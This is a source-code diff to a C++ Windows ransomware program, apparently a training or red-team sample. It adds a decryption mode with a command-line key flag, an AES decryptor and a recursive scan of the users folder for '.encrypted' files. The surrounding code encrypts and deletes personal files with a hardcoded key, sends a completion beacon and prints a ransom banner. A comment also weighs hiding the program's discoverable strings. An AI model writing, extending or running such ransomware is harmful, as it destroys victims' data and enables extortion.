@@ -15,6 +15,7 @@ namespace fs = std::experimental::filesystem;
 #define BLOCK_LEN 128;
 
 bool g_Verbosity = false;
+bool g_Decrypt = false;
 
 bool ExcludePath(std::string checkString)
 {
@@ -47,7 +48,7 @@ bool ExcludePath(std::string checkString)
 bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string key)
 {
 
-	// Note: the param key is not used anywhere - it is a false flag
+	// Note: the param 'key' is not used anywhere - it is a false flag
 
 	wchar_t keyDefault[] = L"Q2hyaXNDbGFyaXNzYVNhbWFudGhhU2t5bGFy"; // ChrisClarissaSamanthaSkylar
 	wchar_t* keyString = keyDefault;
@@ -160,6 +161,7 @@ bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string k
 				std::cout << "Finalizing encrypted data file." << std::endl;
 		}
 
+		// Encrypt data
 		if (!CryptEncrypt(hCryptKey, NULL, isFinal, 0, chunk, &outputLength, chunkSize)) 
 		{
 			if (g_Verbosity)
@@ -169,6 +171,150 @@ bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string k
 
 		DWORD written = 0;
 		if (!WriteFile(hOutputFile, chunk, outputLength, &written, NULL)) 
+		{
+			if (g_Verbosity)
+				std::cout << "WriteFile(output file) failed :(" << std::endl;
+			break;
+		}
+
+		memset(chunk, 0, chunkSize);
+	}
+
+	CryptReleaseContext(hCryptProvider, 0);
+	CryptDestroyKey(hCryptKey);
+	CryptDestroyHash(hCryptHash);
+	CloseHandle(hInputFile);
+	CloseHandle(hOutputFile);
+
+	return true;
+}
+
+bool Decryptor(std::string fileToDecrypt, std::string fileRestored, std::string key)
+{
+
+	// Note: the param 'key' is not used anywhere - it is a false flag
+
+	wchar_t keyDefault[] = L"Q2hyaXNDbGFyaXNzYVNhbWFudGhhU2t5bGFy"; // ChrisClarissaSamanthaSkylar
+	wchar_t* keyString = keyDefault;
+	DWORD keyLength = lstrlenW(keyString);
+
+	// Converting filenames to LPCWSTRs for easier processing wiht CryptoAPIs
+	LPCWSTR inputFile = std::wstring(fileToDecrypt.begin(), fileToDecrypt.end()).c_str();
+	LPCWSTR outputFile = std::wstring(fileRestored.begin(), fileRestored.end()).c_str();
+
+	if (g_Verbosity)
+	{
+		std::wcout << "Key:         " << keyDefault << std::endl;
+		std::cout << "Key (addr):  " << keyString << std::endl;
+		std::cout << "Key length:  " << keyLength << std::endl;
+		std::cout << "Input file:  " << fileToDecrypt.c_str() << std::endl;
+		std::cout << "Output file: " << fileRestored.c_str() << std::endl;
+	}
+
+	HANDLE hInputFile = CreateFileW(inputFile, GENERIC_READ, FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
+	if (hInputFile == INVALID_HANDLE_VALUE)
+	{
+		if (g_Verbosity)
+			std::cout << "Cannot open input file!" << std::endl;
+
+		return false;
+	}
+
+	HANDLE hOutputFile = CreateFileW(outputFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (hOutputFile == INVALID_HANDLE_VALUE)
+	{
+		if (g_Verbosity)
+			std::cout << "Cannot open output file!" << std::endl;
+
+		return false;
+	}
+
+	DWORD dwStatus = 0;
+	BOOL bResult = FALSE;
+	wchar_t info[] = L"Microsoft Enhanced RSA and AES Cryptographic Provider";
+	HCRYPTPROV hCryptProvider;
+
+	if (!CryptAcquireContextW(&hCryptProvider, NULL, info, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
+	{
+		dwStatus = GetLastError();
+		if (g_Verbosity)
+			std::cout << "CryptAcquireContext failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
+
+		CryptReleaseContext(hCryptProvider, 0);
+
+		return false;
+	}
+
+	HCRYPTHASH hCryptHash;
+	if (!CryptCreateHash(hCryptProvider, CALG_SHA_256, 0, 0, &hCryptHash))
+	{
+		dwStatus = GetLastError();
+		if (g_Verbosity)
+			std::cout << "CryptCreateHash failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
+
+		CryptReleaseContext(hCryptProvider, 0);
+
+		return false;
+	}
+
+	if (!CryptHashData(hCryptHash, (BYTE*)keyString, keyLength, 0))
+	{
+		DWORD err = GetLastError();
+		if (g_Verbosity)
+			std::cout << "CryptHashData failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
+
+		return false;
+	}
+	//if (g_Verbosity)
+		//std::cout << "CryptHashData Success! " << std::endl;
+
+	HCRYPTKEY hCryptKey;
+	if (!CryptDeriveKey(hCryptProvider, CALG_AES_128, hCryptHash, 0, &hCryptKey))
+	{
+		dwStatus = GetLastError();
+		if (g_Verbosity)
+			std::cout << "CryptDeriveKey failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
+
+		CryptReleaseContext(hCryptProvider, 0);
+
+		return false;
+	}
+	//if (g_Verbosity)
+		//std::cout << "CryptDeriveKey Success! " << std::endl;
+
+	const size_t chunkSize = BLOCK_LEN;
+	BYTE chunk[chunkSize] = { 0 };
+	DWORD outputLength = 0;
+	BOOL isFinal = FALSE;
+	DWORD readTotalSize = 0;
+	DWORD inputSize = GetFileSize(hInputFile, NULL);
+
+	while (bResult = ReadFile(hInputFile, chunk, chunkSize, &outputLength, NULL))
+	{
+		if (0 == outputLength)
+		{
+			break;
+		}
+
+		readTotalSize += outputLength;
+
+		if (readTotalSize == inputSize)
+		{
+			isFinal = TRUE;
+			if (g_Verbosity)
+				std::cout << "Finalizing encrypted data file." << std::endl;
+		}
+
+		// Decrypt data
+		if (!CryptDecrypt(hCryptKey, NULL, isFinal, 0, chunk, &outputLength))
+		{
+			if (g_Verbosity)
+				std::cout << "CryptDecrypt  failed :(" << std::endl;
+			break;
+		}
+
+		DWORD written = 0;
+		if (!WriteFile(hOutputFile, chunk, outputLength, &written, NULL))
 		{
 			if (g_Verbosity)
 				std::cout << "WriteFile(output file) failed :(" << std::endl;
@@ -226,6 +372,48 @@ bool EncryptAndDeleteThisFile(std::string path)
 		return false;
 }
 
+bool DecryptThisFile(std::string path, std::string decryptionKey)
+{
+	if (g_Verbosity)
+		std::cout << "Decrypting " << path << " ..." << std::endl;
+
+	bool fDecrypted = false;
+	bool fDeleted = false;
+
+	std::string pathRestoreTargetFile = path;
+	pathRestoreTargetFile.erase(pathRestoreTargetFile.end()-10, pathRestoreTargetFile.end());
+
+	fDecrypted = Decryptor(path, pathRestoreTargetFile, decryptionKey);
+
+	if (g_Verbosity)
+	{
+		std::cout << "Decryption result: " << fDecrypted << std::endl;
+		//std::cout << "Restore target file path: " << pathRestoreTargetFile << std::endl;
+	}
+		
+	//TODO : if fDecrypted do delete
+	//fDeleted = DeleteFile(std::wstring(path.begin(), path.end()).c_str());
+	//if (!fDeleted)
+	//{
+	//	DWORD dwStatus;
+	//	dwStatus = GetLastError();
+	//	if (g_Verbosity)
+	//		std::cout << "DeleteFile failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
+	//}
+	//else
+	//{
+	//	if (g_Verbosity)
+	//		std::cout << "Delete result:  " << fDeleted << std::endl;
+	//}
+
+	if (g_Verbosity)
+		std::cout << std::endl;
+
+	if (fDecrypted)
+		return true;
+	else
+		return false;
+}
 
 DWORD FindFiles()
 {
@@ -340,6 +528,48 @@ DWORD FindFiles()
 	return dwFileCounter;
 }
 
+DWORD FindEncryptedFiles(std::string decryptionKey)
+{
+	// Get system drive
+
+	DWORD dwFileCounter = 0;
+	DWORD dwDecryptionCounter = 0;
+
+	// File extension filters to target encrypted files
+	// Lowercase extenstions
+	const std::string encrypted = ".encrypted";
+
+	std::string path = "c:\\users";
+
+	for (const auto& entry : fs::recursive_directory_iterator(path))
+	{
+		// Check for paths to exclude from processing
+		if (ExcludePath(entry.path().string()))
+		{
+			continue; // Excluding path 
+		}
+
+		if (entry.path().extension() == encrypted)
+		{
+			//std::cout << entry.path() << std::endl;
+			dwFileCounter++;
+
+			// Encrypt file
+			if (DecryptThisFile(entry.path().string(), decryptionKey))
+			{
+				dwDecryptionCounter++;
+			}
+		}
+	}
+
+	if (g_Verbosity)
+	{
+		std::cout << "Total files found:     " << dwFileCounter << std::endl;
+		std::cout << "Total files decrypted: " << dwDecryptionCounter << std::endl;
+	}
+
+	return dwFileCounter;
+}
 
 void SendBeacon()
 {
@@ -353,6 +583,7 @@ void RansomMessage()
 
 int main(int argc, char* argv[])
 { 
+	std::string keyDecrypt = "";
 	std::string Banner1 = "We";
 	std::string Banner2 = "lc";
 	std::string Banner3 = "om";
@@ -371,20 +602,55 @@ int main(int argc, char* argv[])
 
     std::cout << BannerFinal << std::endl;
 
-	if (argc > 1)
-	{
-		if (std::string(argv[1]) == "/v")
+	//if (argc > 1)
+	//{
+	//	if (std::string(argv[1]) == "/v")
+	//	{
+	//		g_Verbosity = true;
+	//	}
+	//}
+
+	for (int i = 1; i < argc; ++i) {
+		if (std::string(argv[i]) == "/v") 
 		{
 			g_Verbosity = true;
 		}
+		else if (std::string(argv[i]) == "/d")
+		{
+			if (i + 1 < argc)
+			{ 
+				g_Decrypt = true;
+
+				keyDecrypt = argv[++i];
+			}
+			else
+			{ 
+				// Uh-oh, there was no argument to the destination option.
+			}
+		}
 	}
 
+
 	if (g_Verbosity)
+	{
 		std::cout << "Verbosity: Enabled" << std::endl;
+		std::cout << "Decrypt: " << g_Decrypt << std::endl;
+		std::cout << "keyDecrypt: " << keyDecrypt << std::endl;
+	}
 
+	// Encrypt or Decrypt files?
+	if (!g_Decrypt)
+	{
+		// Finds, Encrypts, and Deletes important personal files
+		FindFiles();
+	}
+	else
+	{
+		// Finds .encrypted files, and decrypts them
+		std::cout << "You entered the decryption key: " << keyDecrypt << std::endl;
 
-	// Finds, Encrypts, and Deletes important personal files
-	FindFiles(); 
+		FindEncryptedFiles(keyDecrypt);
+	}
 
 	// Send network beacon to report ransom completed
 	SendBeacon();
@@ -398,6 +664,12 @@ int main(int argc, char* argv[])
 	// of the std::cout calls in all supporting functions to minimize the 
 	// discoverable strings.  Thoughts?
 
-	std::cout << std::endl << "All Your Files Are Belong To Us!!! :\\" << std::endl;
-
+	if (!g_Decrypt)
+	{
+		std::cout << std::endl << "All Your Files Are Belong To Us!!! :\\" << std::endl;
+	}
+	else
+	{
+		std::cout << std::endl << "All Your Files Are Belong To You!!! :\\" << std::endl;
+	}
 }
